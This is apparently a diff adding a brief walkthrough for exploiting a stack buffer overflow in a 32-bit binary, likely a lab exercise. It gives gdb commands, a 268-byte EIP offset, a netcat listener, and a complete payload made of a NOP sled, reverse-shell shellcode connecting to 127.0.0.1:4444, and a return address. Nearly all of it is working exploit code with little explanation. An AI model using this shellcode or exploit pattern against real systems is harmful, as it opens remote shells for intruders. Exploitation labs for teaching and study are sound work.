@@ -1,0 +1,33 @@
+Set Break 
+
+	b *0x8048559
+
+Enter your payload, It should overwrite EIP after 268 bytes 
+
+	run $(python -c "print('A'*268+'B'*4)"
+
+
+
+
+268 byte offset
+
+Open New Port with createnc.py
+
+	python create_rev_shell.py 127.0.0.1 XXXX
+
+Copy Shellcode to your payload!
+
+Listen the port that you ve opened 
+
+	nc -lvp  XXXX
+
+Verify your connection with
+
+	netstat -ant
+
+And various shell commands!
+
+This sample works with 127.0.0.1 4444 , Do not forget listening 4444 port when you are debugging the executable! Good Luck
+	
+    run $(python -c "print('\x90'*101 + '\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x02\x02\x02\x02\xbb\x7d\x02\x02\x03\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\x90'*74+'\x70\xf3\xff\xbf')")
+
